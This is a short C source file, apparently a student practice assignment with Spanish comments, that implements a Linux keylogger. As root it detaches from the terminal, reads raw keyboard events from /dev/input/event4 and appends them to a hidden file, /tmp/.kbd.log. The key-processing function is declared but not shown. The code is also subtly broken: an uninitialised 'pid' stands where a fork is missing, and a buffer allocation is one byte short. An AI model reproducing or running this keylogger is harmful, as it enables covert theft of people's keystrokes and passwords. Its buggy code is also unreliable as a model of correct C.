#if 0
  // Practica 18
  // Mario Arturo Perez Rangel
  // Keylogger
  // Guarda en el archivo /tmp/.kbd.log la mayoria de las teclas presionadas en el teclado
  // Los caracteres alfanumericos y algunos de puntuacion son almacenados.
  // Los caracteres de funcion, control y shift son guardados con la notacion
  // <B>, <LS>, <RS>, <LC> y <RC>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/types.h>
#include <string.h>

/* El procesamiento de los ticks del teclado se hacen en process_kbd_events */
void process_kbd_events(int, int);

int main()
{
  int kbd, kblog;
  int pid;
  char *archivo, *klarchivo;

  if (geteuid() != 0) {
    fprintf (stderr, "Se requieren permisos de administrador para hacer esto.\n");
    exit (101);
  }

  // Dejamos el programa corriendo sin una terminal asociada
  if (pid>0)
    exit(0);
  setsid();

  // Definir de donde se leen los teclazos.
  // Definir el archivo usado para guardar los teclazos.
  archivo = (char *)malloc(sizeof(char)*strlen("/dev/input/event0")+1);
  klarchivo = (char *)malloc (sizeof(char)*strlen("/tmp/.kbd.log"));
  strcpy (archivo, "/dev/input/event4");
  strcpy (klarchivo, "/tmp/.kbd.log");
  
  kbd = open (archivo, O_RDONLY);
  if (kbd == -1) {
    fprintf (stderr, "No se tiene acceso al teclado.\n");
  }
  kblog = open (klarchivo, O_CREAT|O_WRONLY,
		S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH);
  if (kblog == -1) {
    fprintf (stderr, "No se puede.\n");
  }

  // Asegurar que se esta al final del archivo para agregar las teclas capturadas.
  lseek (kblog, 0, SEEK_END);

  // Entramos al procesamiento de las teclas presionadas.
  process_kbd_events(kbd, kblog);
  
  close (kbd);
  close (kblog);
  exit (0);
}


